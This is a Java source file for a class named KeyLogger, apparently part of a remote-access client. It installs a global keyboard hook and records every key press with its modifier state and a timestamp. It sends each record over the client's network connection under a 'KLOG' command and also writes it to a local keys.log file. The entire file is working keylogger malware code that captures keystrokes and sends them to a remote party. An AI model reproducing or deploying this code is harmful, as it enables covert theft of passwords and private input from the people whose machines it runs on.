package client;

import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;
import java.sql.Timestamp;
import java.text.SimpleDateFormat;

import de.ksquared.system.keyboard.GlobalKeyListener;
import de.ksquared.system.keyboard.KeyEvent;
import de.ksquared.system.keyboard.KeyListener;

public class KeyLogger extends Thread {

	private static final SimpleDateFormat SDF =
			new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
	
	private static final String LOG_FILE = "keys.log";
	
	private Client client;
	
	public KeyLogger(Client client) {
		this.client = client;
	}
	
	@Override
	public void run(){
		
		GlobalKeyListener globalKeyListener = new GlobalKeyListener();
		globalKeyListener.addKeyListener(new KeyListener(){

			@Override
			public void keyPressed(KeyEvent arg0) {
				log(arg0.getVirtualKeyCode() + "\t" + arg0.isShiftPressed()
					+ "\t" + arg0.isAltPressed() + "\t" + arg0.isCtrlPressed());				
			}

			@Override
			public void keyReleased(KeyEvent arg0) {}
			
		});
		
		while (client.doLogKeyboard()) {
			try {
				Thread.sleep(1000);
			} catch (InterruptedException e) {}
		}
		
	}
	
	private void log(String event) {
		String timestamp = SDF.format(
				new Timestamp(System.currentTimeMillis()));
		String line = timestamp + "\t" + event;
		client.getCurConn()
			  .write("KLOG " + client.getClientId(), line.getBytes());
		append(line);
	}
	
	private void append(String event) {
		System.out.println(event);
		try {
			PrintWriter out = new PrintWriter(new FileWriter(LOG_FILE, true));
			out.println(event);
			out.close();
			
		} catch (IOException e) {}
	}

}
